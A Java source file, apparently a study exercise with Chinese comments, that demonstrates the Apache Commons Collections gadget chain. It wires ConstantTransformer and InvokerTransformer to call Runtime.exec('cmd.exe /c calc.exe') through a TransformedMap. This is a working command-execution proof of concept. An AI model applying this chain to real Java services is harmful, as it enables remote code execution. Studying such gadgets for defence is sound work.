package transform;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

public class MyTransformer implements Transformer, Serializable {
    public String name;

    public MyTransformer(String name) {
        System.out.println("in Mytransformer:MyTransformer()");
        this.name = name;
    }

    public static Transformer getInstance(String name ){
        System.out.println("in Mytransformer:getInstance()");
        return new MyTransformer(name);
    }

    @Override
    public Object transform(Object o) {
        System.out.println("in Mytransformer:transform()");
        System.out.println("input is:"+o);
        return this.name;
    }

    public static void main(String[] args) {
            //声明一个Transformer 数组。
            //ConstantTransformer 返回Runtime.getRuntime()实例
            //InvokerTransformer 声明三个参数，供后续Transformer调用
            // this.iMethodName = methodName;
            //        this.iParamTypes = paramTypes;
            //        this.iArgs = args;
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.getRuntime()),
                    new InvokerTransformer("exec", new Class[]{String.class},
                            new Object[]{"cmd.exe /c calc.exe"}),
            };
            //返回Transformer数组对象
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            //生成 如下两个对象：
            // this.keyTransformer = keyTransformer;
            //        this.valueTransformer = valueTransformer;
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            //在setvalue中逐个转换上述的对象，触发漏洞，通过在transformKey 或者 transformValue 中进行个转化
            //最终在InvokerTransformer.tansform 中调用漏洞
            outerMap.put("test", "xxxx");
        }

}


